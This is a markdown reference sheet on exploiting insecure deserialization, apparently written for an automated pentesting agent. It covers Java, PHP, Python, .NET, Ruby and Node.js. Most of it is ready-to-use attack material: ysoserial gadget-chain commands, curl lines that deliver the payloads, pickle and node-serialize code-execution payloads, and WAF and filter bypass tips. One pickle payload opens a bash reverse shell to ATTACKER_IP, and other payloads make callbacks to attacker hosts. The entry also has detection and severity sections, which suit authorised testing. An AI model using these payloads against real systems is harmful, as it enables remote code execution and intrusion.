---
vuln_type: insecure_deserialization
severity: critical
cwe: [CWE-502]
owasp: A08:2021-Software-and-Data-Integrity-Failures
related_tools: [curl, interactsh]
exploit_agent: deserialization_agent
tags: [deserialization, java, php, python, dotnet, ruby, ysoserial, gadget-chains, rce]
---

# Insecure Deserialization

## Overview
Occurs when an application deserializes (reconstructs objects from) untrusted data without validation. Serialized objects can carry executable logic — if an attacker crafts a malicious serialized payload using known "gadget chains" in the application's libraries, they can achieve Remote Code Execution, authentication bypass, or arbitrary data manipulation.

---

## Language-Specific Serialization Formats

| Language | Format | Indicators |
|----------|--------|-----------|
| Java | Binary (ObjectInputStream) | Bytes starting with `AC ED 00 05` or Base64 of `rO0AB` |
| PHP | Custom format | `O:4:"User":2:{s:4:"name";s:5:"admin";...}` |
| Python | Pickle | `\x80\x04\x95` (protocol 4) or Base64 blob in cookie |
| .NET | BinaryFormatter, JSON.NET | `AAEAAAD///` (Base64) or `$type` in JSON |
| Ruby | Marshal | `\x04\x08` magic bytes |
| Node.js | `node-serialize` | `{"rce":"_$$ND_FUNC$$_function(){...}()"}` |

---

## Detection Techniques

### Step 1: Identify serialized data
Look for serialized objects in:
- Cookies (session data, "remember me" tokens)
- Hidden form fields
- API request/response bodies
- URL parameters (Base64-encoded blobs)
- HTTP headers (custom auth tokens)
- WebSocket messages
- File uploads

### Step 2: Recognize the format

**Java serialized object (hex):**
```
AC ED 00 05 73 72 ...
```
**Java serialized object (Base64):**
```
rO0ABXNyAB...
```

**PHP serialized object:**
```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
a:2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
```

**Python pickle (Base64-encoded):**
```
gASVKAAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlH0=
```

**.NET BinaryFormatter (Base64):**
```
AAEAAAD/////AQAAAAAAAAAMAgAAAE...
```

**.NET JSON with type info:**
```json
{"$type": "System.Windows.Data.ObjectDataProvider, ...", ...}
```

### Step 3: Test for deserialization
1. Modify a non-critical field in the serialized data
2. Re-encode and submit
3. If the application processes it → deserialization is happening
4. If error messages reveal class names → strong indicator

---

## Java Deserialization

### Identification
- Look for `rO0AB` in Base64 cookies/parameters
- Look for `AC ED 00 05` in binary data
- ViewState in Java Server Faces (JSF)
- JMX, RMI, JNDI endpoints

### ysoserial — Gadget Chain Generator
```bash
# Generate payload (pick chain based on target's libraries)
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
java -jar ysoserial.jar CommonsCollections5 'curl http://ATTACKER_IP/rce' > payload.bin
java -jar ysoserial.jar CommonsCollections7 'ping -c 3 ATTACKER_IP' > payload.bin

# Base64 encode for HTTP transmission
java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0

# Common gadget chains (try multiple):
# CommonsCollections1-7 (Apache Commons Collections)
# CommonsCollections1  → CC 3.1
# CommonsCollections5  → CC 3.1, works with SecurityManager
# CommonsCollections7  → CC 3.1, no InvokerTransformer
# CommonsBeanutils1    → Commons BeanUtils
# Spring1, Spring2     → Spring Framework
# Hibernate1, Hibernate2 → Hibernate ORM
# Groovy1              → Groovy
# JRMPClient           → triggers JRMP call (OOB)
# URLDNS               → triggers DNS lookup (detection only, no RCE)
```

### URLDNS — Safe Detection (no RCE, DNS only)
```bash
# Best for confirming deserialization without causing harm
java -jar ysoserial.jar URLDNS 'http://UNIQUE_ID.YOUR_INTERACTSH_URL' | base64 -w0
# Submit as cookie/parameter
# If DNS callback received → Java deserialization confirmed
```

### JRMPClient — OOB Confirmation
```bash
java -jar ysoserial.jar JRMPClient 'ATTACKER_IP:1099' | base64 -w0
# Start listener: java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'id'
```

### Sending the payload
```bash
# In a cookie
curl -b "session=$(java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0)" http://target/

# In POST body
java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0 | xargs -I{} curl -X POST http://target/api -d "data={}"

# Raw binary in POST
java -jar ysoserial.jar CommonsCollections1 'id' | curl -X POST http://target/api -H "Content-Type: application/x-java-serialized-object" --data-binary @-
```

---

## PHP Deserialization

### Identification
- Serialized strings in cookies: `O:4:"User":...`
- `unserialize()` calls in source code
- `__wakeup()`, `__destruct()`, `__toString()` magic methods

### Object Injection
Modify serialized object properties:
```php
# Original (user role)
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}

# Modified (escalate to admin)
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

### Magic Method Exploitation
If a class has dangerous magic methods:
```php
# __destruct() that deletes a file
O:8:"TempFile":1:{s:4:"path";s:11:"/etc/passwd";}

# __toString() that reads a file
# __wakeup() that executes a command

# POP chain: chain multiple classes' magic methods
O:9:"ClassA":1:{s:3:"obj";O:9:"ClassB":1:{s:3:"cmd";s:2:"id";}}
```

### Phar deserialization (file upload + LFI chain)
```php
# If you can upload a file and trigger phar:// include:
# 1. Create malicious phar with serialized object in metadata
# 2. Upload as allowed extension (.jpg, .png)
# 3. Trigger: phar://uploads/evil.jpg/test.txt
# This calls unserialize() on the phar metadata
```

### PHP type juggling in deserialization
```php
# Bypass authentication by type confusion
# If code does: if($token == $expected)
# Send boolean true: b:1;
# true == "any_string" is true in PHP loose comparison
```

---

## Python Deserialization (Pickle)

### Identification
- Base64-encoded cookies that decode to binary with `\x80` prefix
- Flask sessions using pickle (older versions)
- Django sessions with PickleSerializer
- Any `pickle.loads()` on user input

### RCE Payloads
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

```python
# Reverse shell via pickle
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

```python
# DNS exfil (safe detection)
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('nslookup YOUR_INTERACTSH_URL',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

### Sending
```bash
# As cookie
curl -b "session=PICKLE_B64_PAYLOAD" http://target/

# As POST parameter
curl -X POST http://target/api -d "data=PICKLE_B64_PAYLOAD"
```

---

## .NET Deserialization

### Identification
- ViewState (ASP.NET): `__VIEWSTATE` parameter
- `BinaryFormatter`, `SoapFormatter`, `ObjectStateFormatter`
- `TypeNameHandling` in JSON.NET (Newtonsoft.Json)
- `$type` field in JSON responses

### ysoserial.net
```powershell
# Generate .NET payload
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "ping ATTACKER_IP" -o base64
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "calc" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping ATTACKER_IP"

# Common .NET gadget chains:
# TypeConfuseDelegate
# WindowsIdentity
# ObjectDataProvider (JSON.NET)
# ActivitySurrogateSelector
```

### JSON.NET TypeNameHandling exploit
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList",
    "$values": ["cmd", "/c ping ATTACKER_IP"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```

### ViewState (ASP.NET)
```bash
# If MAC validation is disabled or key is known:
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "ping ATTACKER_IP" --apppath="/" --path="/page.aspx"

# With known machine key:
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "ping ATTACKER_IP" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

---

## Ruby Deserialization (Marshal)

### Identification
- `Marshal.load()` on user input
- Binary data starting with `\x04\x08`
- Rails session cookies (older versions)

### Exploitation
```ruby
# Universal Deserialisation Gadget for Ruby 2.x-3.x
# Requires Gem with exploitable gadget chain (e.g., ERB, Rack)

require 'erb'
code = "system('id')"
erb = ERB.new("<%= #{code} %>")
# Serialize and send
payload = Marshal.dump(erb)
```

---

## Node.js Deserialization

### Identification
- `node-serialize` or `serialize-javascript` library
- JSON with function definitions

### Exploitation (node-serialize)
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

### Sending
```bash
curl -X POST http://target/api -H "Content-Type: application/json" -d '{"data":{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"curl http://ATTACKER_IP\")}()"}}'
```

---

## Bypass Techniques

### Blacklist bypass (Java)
```bash
# If CommonsCollections is blocked, try other chains:
# CommonsBeanutils1, Hibernate1, Spring1, Groovy1, etc.
# Use ysoserial --list to see all available chains
```

### WAF bypass
```
# Double Base64 encoding
# URL encoding the payload
# Chunked transfer encoding
# Gzip/deflate the serialized data
```

### Look-ahead deserialization bypass (Java)
```bash
# Some filters check the first bytes — prepend valid object before payload
# Or use nested deserialization (serialize inside serialize)
```

---

## Output Interpretation

### Confirmed deserialization indicators
- URLDNS payload triggers DNS callback → Java deserialization confirmed
- ysoserial payload returns command output
- Modified PHP object properties change application behavior
- Python pickle payload executes (DNS/HTTP callback received)
- .NET TypeNameHandling instantiates attacker-specified type

### Not deserialization (false positives)
- Base64-encoded data that's just JSON/plaintext, not serialized objects
- Application rejects modified data with integrity error (HMAC-signed)
- Serialization format present but `unserialize`/`ObjectInputStream` not called on user input

### Severity assessment
- **Critical**: RCE achieved via gadget chain
- **High**: Deserialization confirmed (DNS callback), RCE chain not yet found
- **High**: Authentication bypass via object manipulation (PHP type juggling)
- **Medium**: Deserialization happens but no exploitable gadget chain in classpath
- **Low**: Serialized data found but integrity-protected (signed/encrypted)
